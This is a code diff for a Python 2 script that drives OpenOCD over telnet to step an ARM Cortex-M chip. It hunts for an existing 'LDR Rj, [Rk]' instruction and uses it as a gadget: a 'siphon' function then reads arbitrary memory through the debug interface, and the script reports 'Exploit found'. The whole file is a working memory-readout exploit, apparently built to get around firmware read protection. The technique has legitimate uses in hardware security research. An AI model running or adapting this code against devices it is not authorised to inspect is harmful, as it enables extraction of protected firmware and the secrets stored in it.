@@ -8,11 +8,22 @@ def halt(tn):
     tn.read_until("xPSR")
     tn.read_until("> ")
 
-def reg_all(tn, val):
+def reg_set_all(tn, val):
     for i in range(0, 13):
         tn.write("reg r" + str(i) + " " + str(val) + "\n")
         tn.read_until("> ")
     tn.write("reg sp " + str(val) + "\n")
+    tn.read_until("> ")
+
+def reg_get(tn, name):
+    tn.write("reg " + name + "\n")
+    tn.read_until(": ")
+    val = int(tn.read_until("\n"), 0)
+    tn.read_until("> ")
+    return val
+
+def reg_set(tn, name, val):
+    tn.write("reg " + name + " " + str(val) + "\n")
     tn.read_until("> ")
 
 def reg_dump(tn):
@@ -20,38 +31,52 @@ def reg_dump(tn):
     tn.read_until("arm v7m registers")
     print tn.read_until("=====")
 
-def pc_set(tn, addr):
-    tn.write("reg pc " + str(addr) + "\n")
-    tn.read_until("> ")
-
-def pc_get(tn):
-    tn.write("reg pc\n")
-    tn.read_until(": ")
-    return int(tn.read_until("\n"), 0)
-    
 def step(tn):
     tn.write("step\n")
     tn.read_until("> ")
 
+def siphon(tn, addr, pc, r_addr, r_dest):
+    reg_set(tn, "pc", pc)
+    reg_set_all(tn, 0)
+    reg_set(tn, "r" + str(r_addr), addr)
+    step(tn)
+    return reg_get(tn, "r" + str(r_dest))
+
 
 reg_cont = 0
-search_length = 64
+search_length = 1024
 
 tn = telnetlib.Telnet("localhost", 4444)
 
 print("Halting target")
 halt(tn)
-pc = pc_get(tn)
+pc = reg_get(tn, "pc")
 print("Program counter is " + str(pc))
+msp = reg_get(tn, "msp")
+print("Program counter (banked) is " + str(msp))
 
-for i in xrange(pc, pc + (search_length * 2), 2):
+pc_end = pc + (search_length * 4)
+print("Testing pc from " + str(pc) + " up to " + str(pc_end))
+for i in xrange(pc, pc_end, 4):
+    halt(tn)
     print("Setting program counter to " + str(i))
-    pc_set(tn, i)
-    print("Zeroing registers")
-    reg_all(tn, 0)
-    print("Executing current instruction")
+    reg_set(tn, "pc", i)
+    reg_set_all(tn, 0)
     step(tn)
-    print("Dumping registers")
-    reg_dump(tn)
+    for j in range(0, 13):
+        val = reg_get(tn, "r" + str(j))
+        if val == msp:
+            print("Found candidate: r" + str(j) + " == " + str(msp) + " (MSP)")
+            for k in range(0, 13):
+                if k != j:
+                    reg_set(tn, "pc", i)
+                    reg_set_all(tn, 0)
+                    reg_set(tn, "r" + str(k), 4)
+                    step(tn)
+                    newval = reg_get(tn, "r" + str(j))
+                    if newval != val:
+                        print("Exploit found at pc=" + hex(i) + ": LDR R" + str(j) + ", [R" + str(k) + "]")
+                        print("Code: " + hex(siphon(tn, i, i, k, j)))
+                        sys.exit()
 
 tn.write("exit\n")
